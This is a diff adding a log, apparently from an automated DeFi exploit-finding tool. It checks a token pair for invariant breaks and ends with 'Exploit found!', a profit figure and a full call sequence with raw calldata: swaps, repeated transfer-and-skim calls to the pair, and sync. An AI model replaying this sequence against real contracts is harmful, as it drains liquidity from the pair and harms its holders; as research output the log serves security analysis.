@@ -1,0 +1,222 @@
+target_token: 0x595eac4a0ce9b7175a99094680fbe55a774b5464
+base_token: 0x55d398326f99059ff775485246999027b3197955
+pair: 0x71e1949a1180c0f945fe47c96f88b1a898760c05
+{"bridge": 0xb14f02ef9688c64209d3f10ab7a8827f01407960, "init": 0x00a329c0648769a73afac7f9381e08fb43dbea72, "main_pier": 0x1b3fbb5cbc81b2cdef092c94b9fbd6a818a614c3, "oracle": 0x502be16aa82bad01fdc3feb3c5f8c431f8eeb8ae}
+Block number: 31599443
+Found 9 templates breaking invariant!
+After introducing state-changing calls, found 57 templates breaking invariant!
+loop_num: 2
+Oracle
+bug: PairTokenLoss
+loop_num: 3
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 4
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 5
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 6
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 7
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 2
+Oracle
+bug: PairTokenLoss
+loop_num: 3
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 4
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 5
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 6
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 7
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 2
+Oracle
+bug: PairTokenLoss
+loop_num: 3
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 4
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 5
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 6
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 7
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 2
+Oracle
+bug: PairTokenLoss
+loop_num: 3
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 4
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 5
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 6
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 7
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 2
+Oracle
+bug: PairTokenLoss
+loop_num: 3
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369082, previous_final_balance: 4199575593568438153369082
+loop_num: 4
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369082, previous_final_balance: 4199575593568438153369082
+loop_num: 5
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369082, previous_final_balance: 4199575593568438153369082
+loop_num: 6
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369082, previous_final_balance: 4199575593568438153369082
+loop_num: 7
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369082, previous_final_balance: 4199575593568438153369082
+loop_num: 2
+Oracle
+bug: PairTokenLoss
+loop_num: 3
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153368679, previous_final_balance: 4199575593568438153368881
+loop_num: 4
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153368477, previous_final_balance: 4199575593568438153368679
+loop_num: 5
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153368276, previous_final_balance: 4199575593568438153368477
+loop_num: 6
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153368074, previous_final_balance: 4199575593568438153368276
+loop_num: 7
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153367873, previous_final_balance: 4199575593568438153368074
+loop_num: 8
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153367673, previous_final_balance: 4199575593568438153367873
+loop_num: 9
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153367472, previous_final_balance: 4199575593568438153367673
+loop_num: 10
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153367270, previous_final_balance: 4199575593568438153367472
+loop_num: 11
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153367068, previous_final_balance: 4199575593568438153367270
+loop_num: 2
+Oracle
+bug: PairTokenLoss
+loop_num: 3
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369082, previous_final_balance: 4199575593568438153369082
+loop_num: 4
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369082, previous_final_balance: 4199575593568438153369082
+loop_num: 5
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369082, previous_final_balance: 4199575593568438153369082
+loop_num: 6
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369082, previous_final_balance: 4199575593568438153369082
+loop_num: 7
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369082, previous_final_balance: 4199575593568438153369082
+loop_num: 2
+Oracle
+bug: PairTokenLoss
+loop_num: 3
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 4
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 5
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 6
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 7
+Oracle
+bug: PairTokenLoss
+Loop did not increase final balance final_balance: 4199575593568438153369284, previous_final_balance: 4199575593568438153369284
+loop_num: 2
+Oracle
+bug: PairTokenLoss
+loop_num: 3
+Oracle
+bug: PairTokenLoss
+loop_num: 4
+Oracle
+bug: ProfitGenerated, profit: 520953984139049986463
+Exploit found!
+profit: 520953984139049986463
+
+Staring with 99 of pair balance
+RawTestCase { initial_eth_amount: 1152921504606846976, prefix_swaps: [EVMCall { to: 0x10ed43c718714eb63d5aa57b78b54704e256024e, value: 0, name: "swapExactTokensForTokensSupportingFeeOnTransferTokens", calldata: [92, 17, 215, 149, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 160, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 63, 187, 92, 188, 129, 178, 205, 239, 9, 44, 148, 185, 251, 214, 168, 24, 166, 20, 195, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 85, 211, 152, 50, 111, 153, 5, 159, 247, 117, 72, 82, 70, 153, 144, 39, 179, 25, 121, 85, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 89, 94, 172, 74, 12, 233, 183, 23, 90, 153, 9, 70, 128, 251, 229, 90, 119, 75, 84, 100], args: [Uint(1152921504606846976), Uint(1), Array([Address(0x55d398326f99059ff775485246999027b3197955), Address(0x595eac4a0ce9b7175a99094680fbe55a774b5464)]), Address(0x1b3fbb5cbc81b2cdef092c94b9fbd6a818a614c3), Uint(115792089237316195423570985008687907853269984665640564039457584007913129639935)] }], suffix_swaps: [EVMCall { to: 0x10ed43c718714eb63d5aa57b78b54704e256024e, value: 0, name: "swapExactTokensForTokensSupportingFeeOnTransferTokens", calldata: [92, 17, 215, 149, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 160, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 63, 187, 92, 188, 129, 178, 205, 239, 9, 44, 148, 185, 251, 214, 168, 24, 166, 20, 195, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 89, 94, 172, 74, 12, 233, 183, 23, 90, 153, 9, 70, 128, 251, 229, 90, 119, 75, 84, 100, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 85, 211, 152, 50, 111, 153, 5, 159, 247, 117, 72, 82, 70, 153, 144, 39, 179, 25, 121, 85], args: [Uint(1152921504606846976), Uint(1), Array([Address(0x595eac4a0ce9b7175a99094680fbe55a774b5464), Address(0x55d398326f99059ff775485246999027b3197955)]), Address(0x1b3fbb5cbc81b2cdef092c94b9fbd6a818a614c3), Uint(115792089237316195423570985008687907853269984665640564039457584007913129639935)] }], mutable_calls: [EVMCall { to: 0xb14f02ef9688c64209d3f10ab7a8827f01407960, value: 0, name: "saveBalanceSnapshot", calldata: [13, 24, 189, 25], args: [] }, EVMCall { to: 0x595eac4a0ce9b7175a99094680fbe55a774b5464, value: 0, name: "transfer", calldata: [169, 5, 156, 187, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 113, 225, 148, 154, 17, 128, 192, 249, 69, 254, 71, 201, 111, 136, 177, 168, 152, 118, 12, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0], args: [Address(0x71e1949a1180c0f945fe47c96f88b1a898760c05), Uint(2305843009213693952)] }, EVMCall { to: 0x71e1949a1180c0f945fe47c96f88b1a898760c05, value: 0, name: "skim", calldata: [188, 37, 207, 119, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 63, 187, 92, 188, 129, 178, 205, 239, 9, 44, 148, 185, 251, 214, 168, 24, 166, 20, 195], args: [Address(0x1b3fbb5cbc81b2cdef092c94b9fbd6a818a614c3)] }, EVMCall { to: 0x595eac4a0ce9b7175a99094680fbe55a774b5464, value: 0, name: "transfer", calldata: [169, 5, 156, 187, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 113, 225, 148, 154, 17, 128, 192, 249, 69, 254, 71, 201, 111, 136, 177, 168, 152, 118, 12, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], args: [Address(0x71e1949a1180c0f945fe47c96f88b1a898760c05), Uint(0)] }, EVMCall { to: 0x595eac4a0ce9b7175a99094680fbe55a774b5464, value: 0, name: "transfer", calldata: [169, 5, 156, 187, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 113, 225, 148, 154, 17, 128, 192, 249, 69, 254, 71, 201, 111, 136, 177, 168, 152, 118, 12, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0], args: [Address(0x71e1949a1180c0f945fe47c96f88b1a898760c05), Uint(2305843009213693952)] }, EVMCall { to: 0x71e1949a1180c0f945fe47c96f88b1a898760c05, value: 0, name: "skim", calldata: [188, 37, 207, 119, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 63, 187, 92, 188, 129, 178, 205, 239, 9, 44, 148, 185, 251, 214, 168, 24, 166, 20, 195], args: [Address(0x1b3fbb5cbc81b2cdef092c94b9fbd6a818a614c3)] }, EVMCall { to: 0x595eac4a0ce9b7175a99094680fbe55a774b5464, value: 0, name: "transfer", calldata: [169, 5, 156, 187, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 113, 225, 148, 154, 17, 128, 192, 249, 69, 254, 71, 201, 111, 136, 177, 168, 152, 118, 12, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], args: [Address(0x71e1949a1180c0f945fe47c96f88b1a898760c05), Uint(0)] }, EVMCall { to: 0x595eac4a0ce9b7175a99094680fbe55a774b5464, value: 0, name: "transfer", calldata: [169, 5, 156, 187, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 113, 225, 148, 154, 17, 128, 192, 249, 69, 254, 71, 201, 111, 136, 177, 168, 152, 118, 12, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0], args: [Address(0x71e1949a1180c0f945fe47c96f88b1a898760c05), Uint(2305843009213693952)] }, EVMCall { to: 0x71e1949a1180c0f945fe47c96f88b1a898760c05, value: 0, name: "skim", calldata: [188, 37, 207, 119, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 63, 187, 92, 188, 129, 178, 205, 239, 9, 44, 148, 185, 251, 214, 168, 24, 166, 20, 195], args: [Address(0x1b3fbb5cbc81b2cdef092c94b9fbd6a818a614c3)] }, EVMCall { to: 0x595eac4a0ce9b7175a99094680fbe55a774b5464, value: 0, name: "transfer", calldata: [169, 5, 156, 187, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 113, 225, 148, 154, 17, 128, 192, 249, 69, 254, 71, 201, 111, 136, 177, 168, 152, 118, 12, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], args: [Address(0x71e1949a1180c0f945fe47c96f88b1a898760c05), Uint(0)] }, EVMCall { to: 0x595eac4a0ce9b7175a99094680fbe55a774b5464, value: 0, name: "transfer", calldata: [169, 5, 156, 187, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 113, 225, 148, 154, 17, 128, 192, 249, 69, 254, 71, 201, 111, 136, 177, 168, 152, 118, 12, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0], args: [Address(0x71e1949a1180c0f945fe47c96f88b1a898760c05), Uint(2305843009213693952)] }, EVMCall { to: 0x71e1949a1180c0f945fe47c96f88b1a898760c05, value: 0, name: "skim", calldata: [188, 37, 207, 119, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 63, 187, 92, 188, 129, 178, 205, 239, 9, 44, 148, 185, 251, 214, 168, 24, 166, 20, 195], args: [Address(0x1b3fbb5cbc81b2cdef092c94b9fbd6a818a614c3)] }, EVMCall { to: 0x595eac4a0ce9b7175a99094680fbe55a774b5464, value: 0, name: "transfer", calldata: [169, 5, 156, 187, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 113, 225, 148, 154, 17, 128, 192, 249, 69, 254, 71, 201, 111, 136, 177, 168, 152, 118, 12, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], args: [Address(0x71e1949a1180c0f945fe47c96f88b1a898760c05), Uint(0)] }, EVMCall { to: 0x71e1949a1180c0f945fe47c96f88b1a898760c05, value: 0, name: "sync", calldata: [255, 246, 202, 233], args: [] }, EVMCall { to: 0xb14f02ef9688c64209d3f10ab7a8827f01407960, value: 0, name: "checkInvariantBroken", calldata: [249, 244, 235, 110], args: [] }] }
+time elapsed: Duration { secs: 52, nanos: 550248396 }
